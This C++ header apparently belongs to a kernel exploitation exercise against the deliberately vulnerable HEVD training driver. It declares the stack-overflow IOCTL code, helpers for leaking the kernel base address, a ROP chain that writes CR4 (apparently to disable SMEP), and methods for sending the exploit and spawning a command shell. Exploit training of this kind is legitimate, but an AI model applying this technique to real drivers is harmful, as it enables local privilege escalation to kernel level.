#pragma once

#include "pch.h"

#define IOCTL_SOF_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800,\
	 METHOD_NEITHER, FILE_ANY_ACCESS)

#define DEV_OBJ_NAME "\\\\.\\HackSysExtremeVulnerableDriver"

// SystemInforamtionClass Structs ==>
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation					= 0,
	SystemPerformanceInformation			= 2,
	SystemTimeOfDayInformation				= 3,
	SystemProcessInformation				= 5,
	SystemProcessorPerformanceInformation	= 8,
	SystemModuleInformation					= 11,
	SystemInterruptInformation				= 23,
	SystemExceptionInformation				= 33,
	SystemRegistryQuotaInformation			= 37,
	SystemLookasideInformation				= 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE	Section;
	PVOID	MappedBase;
	PVOID	ImageBase;
	ULONG	ImageSize;
	ULONG	Flags;
	USHORT	LoadOrderIndex;
	USHORT	InitOrderIndex;
	USHORT	LoadCount;
	USHORT	OffsetToFileName;
	UCHAR	FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG								NumberOfModules;
	SYSTEM_MODULE_INFORMATION_ENTRY		Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

// Functions => 

typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS	SystemInformationClass,
	PVOID						SystemInformation,
	ULONG						SystemInformationLength,
	PULONG						ReturnLength
	);

typedef NTSTATUS(NTAPI *_RtlGetVersion)(
	LPOSVERSIONINFOEXW			lpVersionInformation
	);


typedef struct ROP_CHAIN
{

	__int64		_pop_rcx_offset; 
	__int64		_rcx_value;
	__int64		_mov_rcx_cr4_offset;


}PROP_CHAIN;


// Exploit class 

typedef __int64 KernelBase_X64;

class ExploitHevd_x64
{
private:
	DWORD							 _dLen;
	KernelBase_X64					 _typedef_kernelBase;
	HMODULE							 _hNtdll;
	PVOID						 	 _KernelImageBase;
	PSYSTEM_MODULE_INFORMATION		 _pModuleInformation;
	_NtQuerySystemInformation		 _NtQuerySystemInformation_;



	HANDLE							 _DeviceObject_Grabber();
	KernelBase_X64					 _Getting_KernelBase_address_x64();	// Obtaining kernel base address 

public:
	void							 _SendExploit();
	void							 _SpwnCmd();

	PROP_CHAIN* pRpc;

};
